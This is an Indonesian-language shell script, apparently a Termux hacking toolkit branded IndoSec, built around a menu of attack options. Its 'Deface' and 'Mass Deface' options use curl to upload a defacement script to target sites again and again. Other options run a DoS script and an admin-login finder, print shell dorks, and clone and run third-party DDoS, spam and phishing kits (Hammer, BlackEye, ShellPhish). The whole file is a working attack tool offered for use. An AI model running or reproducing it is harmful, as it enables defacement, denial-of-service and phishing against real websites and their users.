g="\033[32;1m"
y="\033[33;1m"
i="\033[34;1m"
r="\033[35;1m"
p="\033[37;1m"
c="\033[36;1m"
w="\033[39;1m"
clear
echo $y"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»«»»»»»"
echo $g""
figlet { IndoSec }
echo $w""
echo "»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»"
echo
echo $g"Author Tools : All Member IndoSec"
echo $w"Tools        : IndoSec"
echo $g"Admin IndoSec:  1) Brilian"
echo $w"                2) Eggy"
echo $g"		3) Evan"
echo $w"		4) Van"
echo $g"		5) Han"
echo $w"spesial Tanks: Mr.TxR87 (Alul)"
echo
echo "«««««««««««««««««»««««««««««««««««««««««««««««««"
sleep 3
echo
echo
echo $g"||==============================================="
echo $g"||"
echo $g"||"$w"1) Deface   || 2) Installer     || 3) Admin login"
echo $g"||"$w"4) Tutorial || 5) Ddos          || 6) Mass Deface"
echo $g"||"$w"7) LocalHost|| 8) Dorking shell || 00) Exit Tools"
echo $g"||"
echo $g"||================================================"
echo $w "╭─Pilih No Tod"
read -p" ╰─$" pilihtod
if [ $pilihtod = "01" ] || [ $pilihtod = "1" ]
then
echo $g""
figlet { IndoSec }
echo $y"Wait!....."
sleep 2
clear
figlet { IndoSec }
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
sleep 1
echo
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
echo
echo $w"Mau lagi !:) "
echo $g""
read -p"[ Y / T ] pilih" kuku
fi

if [ $kuku = "Y" ] || [ $kuku = "y" ]
then
figlet { IndoSec }
echo $y"Wait!....."
sleep 2
clear
figlet { IndoSec }
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
sleep 1
echo
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sh Indosec.sh
fi

if [ $kuku = "T" ] || [ $kuku = "t" ]
then
clear
echo $g"Wait!......."
sh Indosec.sh
fi

if [ $pilihtod = "02" ] || [ $pilihtod = "2" ]
then
clear
echo $y"#################################################"
echo $w""
figlet { IndoSec }
echo ""
echo $g"%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
echo
echo $g"Author Tools : Mr.TxR87 ( alul )"
echo $w"Association  : { IndoSec }"
echo $g"Tanks To     : Brilyan,And all member { IndoSec }"
echo $w"Note         : Tools Ini Milik IndoSec. Tools No recode!!!..."
echo
echo $w"%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
#########################
# CTRL + C
#########################
trap ctrl_c INT
ctrl_c() {
clear
echo $g"( CTRL + C ) detected Wait To Exit!!...."
sleep 1
echo $w"Tanks Dah gunakan Tools No 2"
sleep 1
echo $g"GOOD BAY!!!"
sh Indosec.sh
echo ""
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo ""
echo -N $g"1) Intall Nmap"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"2) Install Hammer"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"3) Install Cmatrix"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"4) Install SpamGrab"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"5) Pure Bold"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"6) DarkFly 400+ tools"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"7) Black Eye"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"8) Shell-phish"
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo -N $g"99) Exit";
echo $w"°>°>°>°>°>°>°>°>°>°>°>°>°>°>°"
echo ""
echo $g"╭─Mr.TxR87"
echo $e"|"
read -p"╰─#" pil;
case $pil in
1) pkg install nmap
echo -e  "${y} {1} Masukkan Web${endc}:"
read web
nmap $web
echo
;;
2)
pkg install python
pkg install git
git clone https://github.com/cyweb/hammer
;;
3)
pkg install cmatrix
cmatrix
;;
4)
apt install git
apt install python
apt install python2
git clone https://github.com/Noxturnix/Spammer-Grab
cd Spammer-Grab
chmod +x *
shauto-install.sh
pip2 install -r requirements.txt
pyhton2 spammer.py
;;
5)
apt install git
apt install python
apt install python2
git clone https://github.com/cr4shcode3/pureblood
cd pureblood
chmod +x *
pip install -r requirements.txt
;;
6)
git clone https://github.com/Ranginang67/DarkFly-Tool
cd DarkFly-Tool
chmod +x *
sh install
;;
7)
apt install git
git clone https://github.com/thelinuxchoice/blackeye.git
cd blackeye
chmod +x *
sh blackeye.sh
;;
8)
apt install git
git clone https://github.com/thelinuxchoice/shellphish
cd shellphish
chmod +x *
sh shellphish.sh
;;
99)
clear
echo $g"created by"$w" : { IndoSec }"
exit
;;
*) echo $g"sorry, pilihan yang anda cari tidak ada"
esac
done
fi

if [ $pilihtod = "03" ] || [ $pilihtod = "3" ]
then
cd Files
echo $g""
figlet { IndoSec }
python2 Adfin.py
fi

if [ $pilihtod = "04" ] || [ $pilihtod = "4" ]
then
echo $g""
figlet { IndoSec }
echo $g"A) Tutor 1"$w" B) Tutor 2"$g" C) Tutor 3"$w" D)tutor 4"
read -p"Pilih no :" tutor
if [ $tutor = "A" ] || [ $tutor = "a" ]
then
echo $g""
read -p"Minta Waktu Baca berapa (ex:10 Dsb):" jeda
cd Files
cat 1.txt
sleep $jeda
cd $HOME/IndoSec
sh Indosec.sh
fi
if [ $tutor = "B" ] || [ $tutor = "b" ]
then
read -p"Minta Waktu Baca berapa (ex:10 Dsb):" jeda1
cd Files
cat 2.txt
sleep $jeda1
cd $HOME/IndoSec
sh Indosec.sh
fi
if [ $tutor = "C" ] || [ $tutor = "c" ]
then
read -p"Minta Waktu Baca berapa (ex:10 Dsb):" jeda2
cd Files
cat 3.txt
sleep $jeda2
cd $HOME/IndoSec
sh Indosec.sh
fi
if [ $tutor = "D" ] || [ $tutor = "d" ]
then
read -p"Minta Waktu Baca berapa (ex:10 Dsb):" jeda3
cd Files
cat 4.txt
sleep $jeda3
cd $HOME/IndoSec
sh Indosec.sh
fi
fi
if [ $pilihtod = "00" ] || [ $pilihtod = "00" ]
then
echo $g""
figlet { IndoSec }
echo $w"===================================================="
echo $g"             Masage :"
echo $w"Tanks Dah Gunakan Tools IndoSec"
echo $g"GOOD BAY!!......"
fi

if [ $pilihtod = "05" ] || [ $pilihtod = "5" ]
then
echo $g""
figlet { IndoSec }
cd Files
python2 IndoSec-DoS.py
fi
if [ $pilihtod = "06" ] || [ $pilihtod = "6" ]
then
figlet { IndoSec }
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"u
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
sleep 1
echo $g"╭─Masukkan Target Lu !!"
echo $w"|"
read -p"╰─Target: $" target
echo $g"╭─Masukkan Script ~/@localhost"
echo $w"|"
read -p"╰─Script:$" sc
curl -T /storage/emulated/0/$sc $target
echo $g"==> = $target"$w"/$sc "
fi
if [ $pilihtod = "07" ] || [ $pilihtod = "7" ]
then
figlet { IndoSec }
echo $g"Wait Conected to localhost!..."
sleep 2
echo $w""
figlet Connect
php -S localhost:8080 -t /storage/emulated/0
fi
if [ $pilihtod = "08" ] || [ $pilihtod = "8" ]
then
figlet { IndoSec }
cd Files
sleep 2
echo $g
cat shell.txt
fi
